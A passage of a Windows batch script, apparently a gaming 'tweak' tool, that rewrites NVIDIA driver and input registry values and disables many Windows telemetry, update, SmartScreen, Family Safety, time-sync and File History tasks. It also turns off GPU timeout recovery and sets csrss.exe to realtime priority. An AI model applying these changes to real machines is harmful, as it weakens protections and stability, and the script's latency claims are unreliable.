reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "D3PCLatency" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "F1TransitionLatency" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "LOWLATENCY" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "Node3DLowLatency" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "PciLatencyTimerControl" /t REG_DWORD /d "20" /f >> APB_Log.txt
cls
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "RMDeepL1EntryLatencyUsec" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "RmGspcMaxFtuS" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "RmGspcMinFtuS" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "RmGspcPerioduS" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "RMLpwrEiIdleThresholdUs" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "RMLpwrGrIdleThresholdUs" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "RMLpwrGrRgIdleThresholdUs" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "RMLpwrMsIdleThresholdUs" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "VRDirectFlipDPCDelayUs" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "VRDirectFlipTimingMarginUs" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "VRDirectJITFlipMsHybridFlipDelayUs" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "vrrCursorMarginUs" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "vrrDeflickerMarginUs" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "vrrDeflickerMaxUs" /t REG_DWORD /d "1" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Force Contigous Memory Allocation
echo Completed
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "PreferSystemMemoryContiguous" /t REG_DWORD /d "1" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Disable HDCP
echo Completed
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "RMHdcpKeyGlobZero" /t REG_DWORD /d "1" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Disable TCC
echo Completed
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "TCCSupported" /t REG_DWORD /d "0" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Disable Tiled Display
echo Completed
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "EnableTiledDisplay" /t REG_DWORD /d "0" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Disable NVIDIA Telemetry
echo Completed
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "NvBackend" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\NVIDIA Corporation\NvControlPanel2\Client" /v "OptInOrOutPreference" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\NVIDIA Corporation\Global\FTS" /v "EnableRID66610" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\NVIDIA Corporation\Global\FTS" /v "EnableRID64640" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\NVIDIA Corporation\Global\FTS" /v "EnableRID44231" /t REG_DWORD /d "0" /f >> APB_Log.txt
schtasks /change /disable /tn "NvTmRep_CrashReport1_{B2FE1952-0186-46C3-BAEC-A80AA35AC5B8}" >> APB_Log.txt
schtasks /change /disable /tn "NvTmRep_CrashReport2_{B2FE1952-0186-46C3-BAEC-A80AA35AC5B8}" >> APB_Log.txt
schtasks /change /disable /tn "NvTmRep_CrashReport3_{B2FE1952-0186-46C3-BAEC-A80AA35AC5B8}" >> APB_Log.txt
schtasks /change /disable /tn "NvTmRep_CrashReport4_{B2FE1952-0186-46C3-BAEC-A80AA35AC5B8}" >> APB_Log.txt
schtasks /change /disable /tn "NvDriverUpdateCheckDaily_{B2FE1952-0186-46C3-BAEC-A80AA35AC5B8}" >> APB_Log.txt
schtasks /change /disable /tn "NVIDIA GeForce Experience SelfUpdate_{B2FE1952-0186-46C3-BAEC-A80AA35AC5B8}" >> APB_Log.txt
schtasks /change /disable /tn "NvTmMon_{B2FE1952-0186-46C3-BAEC-A80AA35AC5B8}" >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Disable NVIDIA Display Power Saving
echo Completed
reg add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm\Global\NVTweak" /v "DisplayPowerSaving" /t REG_DWORD /d "0" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Disable Write Combining
echo Completed
reg add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "DisableWriteCombining" /t REG_DWORD /d "1" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Enable DPC'S for each Core
echo Completed
reg add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "RmGpsPsEnablePerCpuCoreDpc" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm\NVAPI" /v "RmGpsPsEnablePerCpuCoreDpc" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm\Global\NVTweak" /v "RmGpsPsEnablePerCpuCoreDpc" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "RmGpsPsEnablePerCpuCoreDpc" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "RmGpsPsEnablePerCpuCoreDpc" /t REG_DWORD /d "1" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Disable Preemption
echo Completed
reg add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "DisablePreemption" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "DisableCudaContextPreemption" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "EnableCEPreemption" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "DisablePreemptionOnS3S4" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "ComputePreemption" /t REG_DWORD /d "0" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Video Redraw Acceleration
echo Completed
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "Acceleration.Level" /t REG_DWORD /d "0" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Disable NVIDIA 3D Vision Shortcuts
echo Completed
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "DesktopStereoShortcuts" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "FeatureControl" /t REG_DWORD /d "4" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Disable Filter
echo Completed
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "NVDeviceSupportKFilter" /t REG_DWORD /d "0" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Increased Dedicated Video Memory
echo Completed
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "RmCacheLoc" /t REG_DWORD /d "0" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Set NVIDIA Driver Package Install Directory
echo Completed
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "RmDisableInst2Sys" /t REG_DWORD /d "0" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: ReAllocate DMA Buffers
echo Completed
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "RmFbsrPagedDMA" /t REG_DWORD /d "1" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Change PCounter Permissions
echo Completed
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "RmProfilingAdminOnly" /t REG_DWORD /d "0" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Disable DX Event Tracking
echo Completed
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "TrackResetEngine" /t REG_DWORD /d "0" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Disable Verifications in Block Transfer Operations
echo Completed
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "ValidateBlitSubRects" /t REG_DWORD /d "0" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Disable NVIDIA WDDM TDR
echo Completed
reg add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "TdrLevel" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "TdrDelay" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "TdrDdiDelay" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "TdrDebugMode" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "TdrLimitCount" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "TdrLimitTime" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "TdrTestMode" /t REG_DWORD /d "0" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
echo Completed
timeout /t 5 /nobreak > NUL
cls
:: Disable Sticky Keys
echo Completed
reg add "HKCU\Control Panel\Accessibility\StickyKeys" /v "Flags" /t REG_SZ /d "506" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Disable Filter Keys
echo Completed
reg add "HKCU\Control Panel\Accessibility\Keyboard Response" /v "Flags" /t REG_SZ /d "122" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Disable Toggle Keys
echo Completed
reg add "HKCU\Control Panel\Accessibility\ToggleKeys" /v "Flags" /t REG_SZ /d "58" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: MSI Mode for USB Controller
echo Completed
for /f %%i in ('wmic path Win32_USBController get PNPDeviceID^| findstr /l "PCI\VEN_"') do (
reg add "HKLM\SYSTEM\CurrentControlSet\Enum\%%i\Device Parameters\Interrupt Management\MessageSignaledInterruptProperties" /v "MSISupported" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Enum\%%i\Device Parameters\Interrupt Management\Affinity Policy" /v "DevicePriority" /t REG_DWORD /d "0" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Disable USB PowerSavings
echo Completed
reg add "HKLM\SYSTEM\CurrentControlSet\Enum\%%i\Device Parameters" /v "AllowIdleIrpInD3" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Enum\%%i\Device Parameters" /v "D3ColdSupported" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Enum\%%i\Device Parameters" /v "DeviceSelectiveSuspended" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Enum\%%i\Device Parameters" /v "EnableSelectiveSuspend" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Enum\%%i\Device Parameters" /v "EnhancedPowerManagementEnabled" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Enum\%%i\Device Parameters" /v "SelectiveSuspendEnabled" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Enum\%%i\Device Parameters" /v "SelectiveSuspendOn" /t REG_DWORD /d "0" /f >> APB_Log.txt
)
timeout /t 1 /nobreak > NUL
cls
:: Disable Selective Suspend
echo Completed
reg add "HKLM\SYSTEM\CurrentControlSet\Services\USB" /v "DisableSelectiveSuspend" /t REG_DWORD /d "1" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Disable Mouse Acceleration
echo Completed
reg add "HKCU\Control Panel\Mouse" /v "MouseSpeed" /t REG_SZ /d "0" /f >> APB_Log.txt
reg add "HKCU\Control Panel\Mouse" /v "MouseThreshold1" /t REG_SZ /d "0" /f >> APB_Log.txt
reg add "HKCU\Control Panel\Mouse" /v "MouseThreshold2" /t REG_SZ /d "0" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Enable 1:1 Pixel Mouse Movements
echo Completed
reg add "HKCU\Control Panel\Mouse" /v "MouseSensitivity" /t REG_SZ /d "10" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Disable Mouse Smoothing
echo Completed
reg add "HKCU\Control Panel\Mouse" /v "SmoothMouseXCurve" /t REG_BINARY /d "00000000000000000000000000000000000000000000000000000000000000000000000000000000" /f >> APB_Log.txt
reg add "HKCU\Control Panel\Mouse" /v "SmoothMouseYCurve" /t REG_BINARY /d "00000000000000000000000000000000000000000000000000000000000000000000000000000000" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Reduce Keyboard Repeat Delay
echo Completed
reg add "HKCU\Control Panel\Keyboard" /v "KeyboardDelay" /t REG_SZ /d "0" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Reduce Keyboard Repeat Rate
echo Completed
reg add "HKCU\Control Panel\Keyboard" /v "KeyboardSpeed" /t REG_SZ /d "31" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Mouse Data Queue Size
echo Completed
reg add "HKLM\SYSTEM\CurrentControlSet\Services\mouclass\Parameters" /v "MouseDataQueueSize" /t REG_DWORD /d "20" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Keyboard Data Queue Size
echo Completed
reg add "HKLM\SYSTEM\CurrentControlSet\Services\kbdclass\Parameters" /v "KeyboardDataQueueSize" /t REG_DWORD /d "20" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: DebugPollInterval (BeersE#9366)
echo Completed
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DebugPollInterval" /t REG_DWORD /d "1000" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Setting CSRSS to Realtime
echo Completed
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\csrss.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\csrss.exe\PerfOptions" /v "IoPriority" /t REG_DWORD /d "3" /f >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
echo Completed
schtasks /end /tn "\Microsoft\Windows\Customer Experience Improvement Program\Consolidator" >> APB_Log.txt
schtasks /change /tn "\Microsoft\Windows\Customer Experience Improvement Program\Consolidator" /disable >> APB_Log.txt
schtasks /end /tn "\Microsoft\Windows\Customer Experience Improvement Program\BthSQM" >> APB_Log.txt
schtasks /change /tn "\Microsoft\Windows\Customer Experience Improvement Program\BthSQM" /disable >> APB_Log.txt
schtasks /end /tn "\Microsoft\Windows\Customer Experience Improvement Program\KernelCeipTask" >> APB_Log.txt
schtasks /change /tn "\Microsoft\Windows\Customer Experience Improvement Program\KernelCeipTask" /disable >> APB_Log.txt
schtasks /end /tn "\Microsoft\Windows\Customer Experience Improvement Program\UsbCeip" >> APB_Log.txt
schtasks /change /tn "\Microsoft\Windows\Customer Experience Improvement Program\UsbCeip" /disable >> APB_Log.txt
schtasks /end /tn "\Microsoft\Windows\Customer Experience Improvement Program\Uploader" >> APB_Log.txt
schtasks /change /tn "\Microsoft\Windows\Customer Experience Improvement Program\Uploader" /disable >> APB_Log.txt
schtasks /end /tn "\Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser" >> APB_Log.txt
cls
schtasks /change /tn "\Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser" /disable >> APB_Log.txt
schtasks /end /tn "\Microsoft\Windows\Application Experience\ProgramDataUpdater" >> APB_Log.txt
schtasks /change /tn "\Microsoft\Windows\Application Experience\ProgramDataUpdater" /disable >> APB_Log.txt
schtasks /end /tn "\Microsoft\Windows\Application Experience\StartupAppTask" >> APB_Log.txt
schtasks /change /tn "\Microsoft\Windows\Application Experience\StartupAppTask" /disable >> APB_Log.txt
schtasks /end /tn "\Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticDataCollector" >> APB_Log.txt
schtasks /change /tn "\Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticDataCollector" /disable >> APB_Log.txt
schtasks /end /tn "\Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticResolver" >> APB_Log.txt
schtasks /change /tn "\Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticResolver" /disable >> APB_Log.txt
schtasks /end /tn "\Microsoft\Windows\Power Efficiency Diagnostics\AnalyzeSystem" >> APB_Log.txt
schtasks /change /tn "\Microsoft\Windows\Power Efficiency Diagnostics\AnalyzeSystem" /disable >> APB_Log.txt
schtasks /end /tn "\Microsoft\Windows\Shell\FamilySafetyMonitor" >> APB_Log.txt
schtasks /change /tn "\Microsoft\Windows\Shell\FamilySafetyMonitor" /disable >> APB_Log.txt
schtasks /end /tn "\Microsoft\Windows\Shell\FamilySafetyRefresh" >> APB_Log.txt
schtasks /change /tn "\Microsoft\Windows\Shell\FamilySafetyRefresh" /disable >> APB_Log.txt
schtasks /end /tn "\Microsoft\Windows\Shell\FamilySafetyUpload" >> APB_Log.txt
schtasks /change /tn "\Microsoft\Windows\Shell\FamilySafetyUpload" /disable >> APB_Log.txt
schtasks /end /tn "\Microsoft\Windows\Autochk\Proxy" >> APB_Log.txt
cls
schtasks /change /tn "\Microsoft\Windows\Autochk\Proxy" /disable >> APB_Log.txt
schtasks /end /tn "\Microsoft\Windows\Maintenance\WinSAT" >> APB_Log.txt
schtasks /change /tn "\Microsoft\Windows\Maintenance\WinSAT" /disable >> APB_Log.txt
schtasks /end /tn "\Microsoft\Windows\Application Experience\AitAgent" >> APB_Log.txt
schtasks /change /tn "\Microsoft\Windows\Application Experience\AitAgent" /disable >> APB_Log.txt
schtasks /end /tn "\Microsoft\Windows\Windows Error Reporting\QueueReporting" >> APB_Log.txt
schtasks /change /tn "\Microsoft\Windows\Windows Error Reporting\QueueReporting" /disable >> APB_Log.txt
schtasks /end /tn "\Microsoft\Windows\CloudExperienceHost\CreateObjectTask" >> APB_Log.txt
schtasks /change /tn "\Microsoft\Windows\CloudExperienceHost\CreateObjectTask" /disable >> APB_Log.txt
schtasks /end /tn "\Microsoft\Windows\DiskFootprint\Diagnostics" >> APB_Log.txt
schtasks /change /tn "\Microsoft\Windows\DiskFootprint\Diagnostics" /disable >> APB_Log.txt
schtasks /end /tn "\Microsoft\Windows\FileHistory\File History (maintenance mode)" >> APB_Log.txt
schtasks /change /tn "\Microsoft\Windows\FileHistory\File History (maintenance mode)" /disable >> APB_Log.txt
schtasks /end /tn "\Microsoft\Windows\PI\Sqm-Tasks" >> APB_Log.txt
schtasks /change /tn "\Microsoft\Windows\PI\Sqm-Tasks" /disable >> APB_Log.txt
schtasks /end /tn "\Microsoft\Windows\NetTrace\GatherNetworkInfo" >> APB_Log.txt
cls
schtasks /change /tn "\Microsoft\Windows\NetTrace\GatherNetworkInfo" /disable >> APB_Log.txt
schtasks /end /tn "\Microsoft\Windows\AppID\SmartScreenSpecific" >> APB_Log.txt
schtasks /change /tn "\Microsoft\Windows\AppID\SmartScreenSpecific" /disable >> APB_Log.txt
schtasks /end /tn "\Microsoft\Office\OfficeTelemetryAgentFallBack2016" >> APB_Log.txt
schtasks /change /tn "\Microsoft\Office\OfficeTelemetryAgentFallBack2016" /disable >> APB_Log.txt
schtasks /end /tn "\Microsoft\Office\OfficeTelemetryAgentLogOn2016" >> APB_Log.txt
schtasks /change /tn "\Microsoft\Office\OfficeTelemetryAgentLogOn2016" /disable >> APB_Log.txt
schtasks /end /tn "\Microsoft\Office\OfficeTelemetryAgentLogOn" >> APB_Log.txt
schtasks /change /TN "\Microsoft\Office\OfficeTelemetryAgentLogOn" /disable >> APB_Log.txt
schtasks /end /tn "\Microsoftd\Office\OfficeTelemetryAgentFallBack" >> APB_Log.txt
schtasks /change /TN "\Microsoftd\Office\OfficeTelemetryAgentFallBack" /disable >> APB_Log.txt
schtasks /end /tn "\Microsoft\Office\Office 15 Subscription Heartbeat" >> APB_Log.txt
schtasks /change /TN "\Microsoft\Office\Office 15 Subscription Heartbeat" /disable >> APB_Log.txt
cls
schtasks /end /tn "\Microsoft\Windows\Time Synchronization\ForceSynchronizeTime" >> APB_Log.txt
schtasks /change /TN "\Microsoft\Windows\Time Synchronization\ForceSynchronizeTime" /disable >> APB_Log.txt
schtasks /end /tn "\Microsoft\Windows\Time Synchronization\SynchronizeTime" >> APB_Log.txt
schtasks /change /TN "\Microsoft\Windows\Time Synchronization\SynchronizeTime" /disable >> APB_Log.txt
schtasks /end /tn "\Microsoft\Windows\WindowsUpdate\Automatic App Update" >> APB_Log.txt
schtasks /change /TN "\Microsoft\Windows\WindowsUpdate\Automatic App Update" /disable >> APB_Log.txt
schtasks /end /tn "\Microsoft\Windows\Device Information\Device" >> APB_Log.txt
schtasks /change /TN "\Microsoft\Windows\Device Information\Device" /disable >> APB_Log.txt
timeout /t 1 /nobreak > NUL
cls
:: Disable Telemetry Through Registry
echo Completed
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Device Metadata" /v "PreventDeviceMetadataFromNetwork" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKCU\SOFTWARE\Microsoft\InputPersonalization" /v "RestrictImplicitInkCollection" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKCU\SOFTWARE\Microsoft\InputPersonalization" /v "RestrictImplicitTextCollection" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Sensor\Permissions\{BFA794E4-F964-4FDB-90F6-51056BFE4B44}" /v "SensorPermissionState" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Sensor\Overrides\{BFA794E4-F964-4FDB-90F6-51056BFE4B44}" /v "SensorPermissionState" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WUDF" /v "LogEnable" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WUDF" /v "LogLevel" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f >> APB_Log.txt
cls
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "DoNotShowFeedbackNotifications" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "AllowCommercialDataPipeline" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "AllowDeviceNameInTelemetry" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "LimitEnhancedDiagnosticDataWindowsAnalytics" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "MicrosoftEdgeDataOptIn" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKCU\SOFTWARE\Microsoft\Siuf\Rules" /v "NumberOfSIUFInPeriod" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKCU\SOFTWARE\Microsoft\Siuf\Rules" /v "PeriodInNanoSeconds" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKCU\SOFTWARE\Policies\Microsoft\Assistance\Client\1.0" /v "NoExplicitFeedback" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Policies\Microsoft\Assistance\Client\1.0" /v "NoActiveHelp" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\AppCompat" /v "DisableInventory" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\AppCompat" /v "AITEnable" /t REG_DWORD /d "0" /f >> APB_Log.txt
cls
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\AppCompat" /v "DisableUAR" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\TabletPC" /v "PreventHandwritingDataSharing" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\TabletPC" /v "DoSvc" /t REG_DWORD /d "3" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\LocationAndSensors" /v "DisableLocation" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\LocationAndSensors" /v "DisableLocationScripting" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\LocationAndSensors" /v "DisableSensors" /t REG_DWORD /d "1" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\LocationAndSensors" /v "DisableWindowsLocationProvider" /t REG_DWORD /d "1" /f >> APB_Log.txt
